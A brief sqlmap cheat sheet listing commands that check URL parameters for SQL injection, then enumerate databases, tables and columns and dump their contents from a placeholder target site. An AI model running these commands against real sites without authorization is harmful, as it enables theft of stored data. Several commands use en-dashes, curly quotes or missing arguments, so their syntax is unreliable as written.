# SQLMAP:

## Automate the sql injection: 

Cmds - CHECKING: Search for the parameter which result into the sql error: - 

Simple SQL injection check: > 

```jsx
sqlmap -u “https://target_site.com/page/” - 
```

Multiple Paramter SQLi check: >

```jsx
sqlmap -u “https://target_site.com/page?p1=value1&p2=value2”  
```

Specific paramter check: > 

```jsx
sqlmap -u “https://target_site.com/page?p1=value1&p2=value2” -p p1 - 
```

With request: > 

```jsx
sqlmap -r “File_contaning_request header+body” -
```

USe previous sessions: > 

```jsx
sqlmap -u “https://target_site.com/page?p1=value1” -s SESSION-FILE.sqlite 
```

## Cmds - Exploiting:

List of Database: > 

```jsx
sqlmap -u “https://target_site.com/page?p1=value1” –dbs - 
```

List of tables in the Database: > 

```jsx
sqlmap -u “https://target_site.com/page?p1=value1” -D  –tables - 
```

List of columns in the table : >

```jsx
 sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB -T TARGET_TABLE –columns 
```

- for Dumping the data of columns and tables: > 

```jsx
sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB -T TARGET_TABLE –dump
```

```
sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB --dump

sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB -T TARGET_TABLE -C "Col1,Col2" --dump
```

## Different Risk and Level:

- Add the tag risk and level to maximize the effort of getting the sqli.
- risk=3 level=5 /// maximum values

## Contributors:
- [Prince Prafull](https://twitter.com/princeprafull3)

## Reference:

- https://thedarksource.com/sqlmap-cheat-sheet/
- [https://dl.packetstormsecurity.net/papers/cheatsheets/sqlmap-cheatsheet-1.0-SDB.pdf](https://dl.packetstormsecurity.net/papers/cheatsheets/sqlmap-cheatsheet-1.0-SDB.pdf)